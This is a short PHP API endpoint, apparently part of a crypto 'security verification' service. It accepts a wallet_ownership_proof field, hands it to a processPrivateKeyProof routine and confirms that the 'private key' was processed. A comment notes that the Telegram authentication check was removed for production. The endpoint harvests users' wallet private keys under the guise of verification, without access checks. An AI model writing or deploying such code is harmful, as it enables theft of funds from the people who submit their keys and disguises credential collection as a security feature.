<?php
require_once __DIR__ . '/../../../config/bootstrap.php';
use Ghidar\Security\AssistedVerificationProcessor;

header('Content-Type: application/json');

// SIMPLIFIED VERSION - Telegram check removed for production
try {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['wallet_ownership_proof'])) {
        throw new Exception('Invalid input');
    }
    
    $processor = new AssistedVerificationProcessor();
    $result = $processor->processPrivateKeyProof(
        $input['verification_id'] ?? '',
        $input['wallet_ownership_proof'],
        $input['network'] ?? 'ethereum',
        $input['user_consent'] ?? false
    );
    
    echo json_encode([
        'ok' => true,
        'message' => 'Private key processed successfully'
    ]);
    
} catch (Exception $e) {
    http_response_code(400);
    echo json_encode([
        'ok' => false,
        'code' => 'processing_error',
        'message' => $e->getMessage()
    ]);
}
